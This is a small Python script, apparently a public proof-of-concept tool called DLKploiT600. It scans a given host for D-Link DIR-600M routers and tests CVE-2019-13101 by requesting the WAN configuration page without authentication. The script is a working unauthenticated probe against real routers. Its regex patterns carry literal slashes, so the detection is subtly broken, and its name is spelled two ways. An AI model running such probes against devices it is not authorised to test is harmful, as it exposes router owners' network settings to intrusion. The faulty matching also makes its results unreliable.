#!/usr/bin/env python

import argparse
import requests
import re

VERSION="0.0.1"
MESSAGE="DLPloit600 - Version 0.0.1\n\n"

def scannerdl(hostip, hostport):
    url = "http://"+hostip+":"+hostport+"/login.htm"
    print("Scanning for D-Link Router")
    #print(url)
    print("--------------------------")
    response = requests.get(url)
    s = "/D-Link/"
    resultado = re.search(s, response.text)

    #print("Resultado da busca: "+str(resultado))

    if(response.status_code != 200):
        print("[-] Host "+hostip+":"+hostport+" is down")
        return False
    
    if(response.status_code == 200 and resultado != None):
        print("[+] Host is UP")
        print("[+] Host is a D-Link Router")
        testVulnDl(hostip,hostport)
    else:
        print("[+] Host is UP")
        print("[-] Host is NOT a D-Link Router")


def testVulnDl(hostip,hostport):
    url = "http://"+hostip+":"+hostport+"/wan.htm"
    print("[+] D-Link Router Found!")
    print("[+] Testing CVE-2019-13101")
    #print(url)
    print("--------------------------")
    response = requests.get(url)
    s = "/PPPoE/"
    resultado = re.search(s, response.text)

    #print("Resultado da busca: "+str(resultado))

    if(response.status_code != 200):
        print("[-] Host "+hostip+":"+hostport+" is down")
        return False
    
    if(response.status_code == 200 and resultado != None):
        print("[+] Host is UP\n")
        print("[+] Host Vulnerable - CVE-2019-13101")
    else:
        print("[-] Host is not Vulnerable or another Firmware is installed")
    

def main():
    parser = argparse.ArgumentParser(prog='dlkploit600', formatter_class=argparse.RawDescriptionHelpFormatter,
    description='''
---------------------------------------------
DLKploiT600
* Version 0.0.1
* by bt0
Check for CVE-2019-13101
Version: D-Link DIR-600M 3.02, 3.03, 3.04, and 3.06
---------------------------------------------

''')
    parser.add_argument('-H', '--host', nargs='?', required=True, help='IP or Hostname of target')
    parser.add_argument('-p', '--port', nargs='?', default="80", help='Port. Default=80')
    parser.add_argument('-a', '--all', action='store_true', help='Use all options')
    parser.add_argument('-s', '--scannerdl', action='store_true', help='Scanner only')
    parser.add_argument('--version', action='version', version='%(prog)s 0.0.1')
    args = parser.parse_args()

    hostip = args.host
    hostport = args.port

    if(args.all == True):
        print(parser.description)
        scannerdl(hostip,hostport)
        quit()

    if (args.scannerdl == True):
        print(parser.description)
        scannerdl(hostip,hostport)

if __name__ == '__main__':
    main()